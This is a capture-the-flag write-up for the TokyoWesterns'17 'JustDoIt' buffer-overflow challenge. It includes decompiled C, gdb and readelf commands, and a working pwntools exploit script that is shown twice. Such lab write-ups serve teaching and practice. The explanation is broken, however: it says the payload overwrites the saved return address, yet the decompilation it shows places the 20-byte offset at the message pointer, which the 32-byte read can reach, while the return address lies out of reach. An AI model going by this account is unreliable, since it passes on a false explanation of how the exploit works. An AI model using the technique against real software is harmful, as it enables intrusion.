# TokyoWesterns'17 - JustDoIt (BOF) — Writeup

**Category:** pwn / buffer overflow (binary exploitation)

**Files present in the challenge folder**

```
flag.txt   # contains the flag (read by the binary at runtime)
ghidra.txt # Ghidra decompilation output (main function)
just       # the vulnerable binary (ELF)
just.cast  # a ttycast recording of an interactive run (useful to replay)
just.py    # exploit script using pwntools
```

---

## Quick summary

This is a classic stack-based buffer overflow. The binary reads user input into a fixed-size stack buffer using `fgets()` with a larger size than the buffer, allowing us to overwrite the saved frame data (saved EBP / saved return address). By crafting a payload that overwrites the return address, we can hijack control flow to achieve the challenge goal (the provided exploit overwrites the return address with a convenient symbol address and prints the flag).

---

## Decompiled `main()` (from `ghidra.txt`)

```c
undefined4 main(void)
{
  char *pcVar1;
  int iVar2;
  char local_28 [16];         // 16-byte stack buffer
  FILE *local_18;
  char *local_14;
  undefined1 *local_c;

  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    perror("file open error.\n");
    exit(0);
  }
  pcVar1 = fgets(flag,0x30,local_18);  // flag is read into a global buffer
  if (pcVar1 == (char *)0x0) {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,0x20,stdin);  // <-- reads 0x20 (32) bytes INTO a 16-byte buffer
  if (pcVar1 == (char *)0x0) {
    perror("input error.\n");
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```

### Important observations

- `local_28` is a 16-byte stack buffer.
- The program calls `fgets(local_28, 0x20, stdin)`: it allows up to **32 bytes** to be read into a **16-byte** buffer — a clear buffer overflow.
- After reading input the program compares the input to a `PASSWORD`. If the compare succeeds it changes the message printed.
- The flag is loaded from `flag.txt` into a global variable named `flag` earlier in `main()`.

---

## Vulnerability (root cause)

Using `fgets()` with a larger length than the destination buffer makes it possible to overwrite stack data (saved EBP and the saved return address). The stack layout around `local_28` is roughly:

```
[ higher addresses ]
... saved return address  <-- overwrite here to change control flow
... saved EBP
local_28 (16 bytes)
[ lower addresses ]
```

So to reach the return address we need `16 (buffer) + 4 (saved EBP) = 20` bytes of padding.

---

## Determining the exact offset (recommended workflow)

You can confirm the offset with either `gdb` + cyclic patterns (pwntools `cyclic`) or by reasoning from the stack layout shown above.

Example using pwntools from a Python REPL or script:

```py
from pwn import *
# generate a cyclic pattern
pat = cyclic(100)
p = process('./just')
p.recvuntil(b"Input the password.")
p.sendline(pat)
# run the binary in gdb or inspect a crash to find the offset
```

If the program crashes and you find the overwritten value at the instruction pointer is `0x6161616b` (for example), use `cyclic_find` to get the offset:

```py
cyclic_find(0x6161616b)
```

For this binary the offset works out to **20** bytes (16-byte buffer + 4-byte saved EBP).

---

## Finding useful addresses (symbols / data)

We can inspect the binary to find useful addresses (global variables, strings, functions). Typical commands:

```bash
readelf -s just | grep -E "flag|PASSWORD|failed_message|success_message"
nm -n just | grep flag
objdump -s -j .rodata just | less
```

The exploit provided in the repository uses the address `0x0804a080` — this address was found by inspecting the binary's symbols/sections (e.g. `readelf`/`objdump`/`nm`) and corresponds to a useful symbol/data in the binary which the exploit targets.

---

## Exploitation

**Payload structure**

- `b"A" * 20` — padding up to the saved return address.
- `p32(0x0804a080)` — overwrite the saved return address with the chosen address (found in the previous step).

`just.py` (included in the folder) implements this exploit using pwntools:

```py
from pwn import *
pay = b''
pay += b"A"*20
pay += p32(0x804a080)

p = process('./just')
p.recvuntil(b"Input the password.")
p.sendline(pay)
p.interactive()
```

**Run it**

```bash
python3 just.py
```

The script sends the crafted payload and drops you into interactive mode so you can see the program output. In the challenge environment this produces the desired output (the flag or a message change depending on the symbol targeted).

---

## GDB walkthrough (recommended commands)

Start the program in gdb and set a breakpoint after the `fgets` call or at `main`'s return to inspect the stack:

```gdb
gdb -q ./just
break main
run
# single-step or set a breakpoint after fgets to inspect stack
# Example: set a breakpoint at the instruction after the fgets call or at the strcmp call
break *main+<offset-to-strcmp>
continue
# when stopped, examine stack and buffer
x/32xb $esp-0x40   # view surrounding stack bytes
```

Use `info frame`, `info registers`, and `x/s` / `x/x` to inspect memory locations and confirm where `local_28` is laid out and how many bytes are needed to reach the saved return address.

---

## Example output (what to expect)

When running the vulnerable binary normally:

```
$ ./just
Welcome my secret service. Do you know the password?
Input the password.
AAAAAAAAAAAAAAAA
Invalid Password, Try Again!
```

When running `just.py` with the crafted payload you should see the altered behavior and the flag (or a changed success message) depending on the exact binary build and address targeted.

---

## Full exploit script (copy from repository)

Include the `just.py` present in the folder. It is short and already functional:

```py
from pwn import *
pay = b''
pay += b"A"*20
pay += p32(0x804a080)
p = process('./just')
p.recvuntil(b"Input the password.")
p.sendline(pay)
p.interactive()
```

---

## Conclusion

This challenge is an instructive example of a classic stack-based buffer overflow caused by mismatched buffer sizes and `fgets()` usage. The exploit overwrites the saved return address by sending `20` bytes of padding followed by a 4-byte address discovered in the binary. Reproducing the exploit requires confirming the offset with cyclic patterns in pwntools and finding the target address with `readelf`/`nm`/`objdump` or `gdb`.